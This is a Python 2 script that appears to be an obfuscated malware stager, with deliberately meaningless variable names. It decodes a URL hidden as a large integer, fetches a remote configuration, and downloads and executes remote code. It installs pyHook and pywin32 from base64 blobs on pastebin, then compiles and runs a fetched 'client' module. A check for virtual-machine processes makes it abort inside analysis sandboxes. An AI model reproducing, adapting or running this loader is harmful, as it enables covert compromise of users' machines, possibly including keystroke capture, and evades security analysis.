import os
import sys
import imp
import json
import struct
import base64
import urllib



def run(*args, **kwargs):
    IncontinentObtuseCucumber = lambda x: long(bytes(x).encode('hex'), 16)
    SomberUnbecomingAmusement = lambda x: bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))
    RuthlessSpiffyTablecloth  = lambda x: os.popen(' '.join([i for i in x])).read().rstrip() if type(x) is list else os.popen(x).read().rstrip()
    AccidentalAquaticCactus   = json.loads(urllib.urlopen(SomberUnbecomingAmusement(kwargs.get('config'))).read())
    AccidentalAquaticCactus['settings']['__f__'] = bytes(IncontinentObtuseCucumber(__file__)) if '__file__' in globals() else ''
    GroovySophisticatedLemur  = os.popen('where pip').read().rstrip() if os.name is 'nt' else os.popen('which pip').read().rstrip()
    os.chdir(os.path.expandvars('%TEMP%')) if os.name is 'nt' else os.chdir('/tmp')
    if not len(GroovySophisticatedLemur):
        exec urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__y__'))).read() in globals()
        exec urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__x__'))).read() in globals()
    else:
        try:
            for FoamyNonstopHistory, NobleRusticWalrus in AccidentalAquaticCactus['packages'][os.name][str(struct.calcsize('P') * 8)].items():
                if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
                    RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', FoamyNonstopHistory])
                    if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
                        if 'pyHook' in FoamyNonstopHistory and 'pastebin' in NobleRusticWalrus:
                            ZonkedEnthusiasticTadpole = 'pyHook-1.5.1-cp27-cp27m-win_amd64.whl'
                            with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
                                fp.write(base64.b64decode(urllib.urlopen(NobleRusticWalrus).read()))
                            RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', ZonkedEnthusiasticTadpole])
                            if os.path.isfile(ZonkedEnthusiasticTadpole):
                                os.remove(ZonkedEnthusiasticTadpole)
                        elif 'pypiwin32' in FoamyNonstopHistory and 'pastebin' in NobleRusticWalrus:
                            ZonkedEnthusiasticTadpole = 'pywin32-221-cp27-cp27m-win_amd64.whl'
                            with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
                                fp.write(base64.b64decode(urllib.urlopen(NobleRusticWalrus).read()))
                            RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', ZonkedEnthusiasticTadpole])
                            SilkyPerilousManifesto    = os.path.join(sys.prefix, os.path.join('Scripts', 'pywin32_postinstall.py'))
                            if os.path.isfile(SilkyPerilousManifesto):
                                RuthlessSpiffyTablecloth([SilkyPerilousManifesto, '-install'])
                            if os.path.isfile(ZonkedEnthusiasticTadpole):
                                os.remove(ZonkedEnthusiasticTadpole)
                        else:
                            RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', NobleRusticWalrus])
                    else:
                        print FoamyNonstopHistory, 'loaded'
                        continue
                else:
                    print FoamyNonstopHistory, 'loaded'
                    continue
        finally:
            AmbiguousObedientQuestion   = SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__u__'))
            TalentedAlcoholicBeetle     = os.path.splitext(os.path.basename(AmbiguousObedientQuestion))[0]
            PanoramicAbandonedCraftsman = imp.new_module(TalentedAlcoholicBeetle)
            QuarrelsomeImportedAtom     = urllib.urlopen(AmbiguousObedientQuestion).read()
            MajesticMachoOkra           = compile(QuarrelsomeImportedAtom, TalentedAlcoholicBeetle, 'exec')
            exec MajesticMachoOkra in PanoramicAbandonedCraftsman.__dict__
            sys.modules['client']       = PanoramicAbandonedCraftsman
            globals()['client']         = PanoramicAbandonedCraftsman
            return sys.modules['client'].main(**AccidentalAquaticCactus['settings'])

def main(*args, **kwargs):
    s = 'tasklist' if os.name is 'nt' else 'ps'
    c = 0 if os.name is 'nt' else -1
    if 'checkvm' in kwargs:
        if bool([i.split()[c] for i in os.popen(s).read().splitlines()[2:] if i.split()[c].lower().split('.')[0] in (kwargs.get('procs') or ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem'])]) if (bool(kwargs.get('checkvm')) if 'checkvm' in kwargs else False) else bool([]):
            print 'aborting...'
            return
    if 'config' in kwargs:
        return run(**kwargs)
    else:
        print "missing argument 'config'"
        return
    

if __name__ == '__main__':
    main(config=12095051301478169748777225282050429328988589300942044190524179902531108032573017)
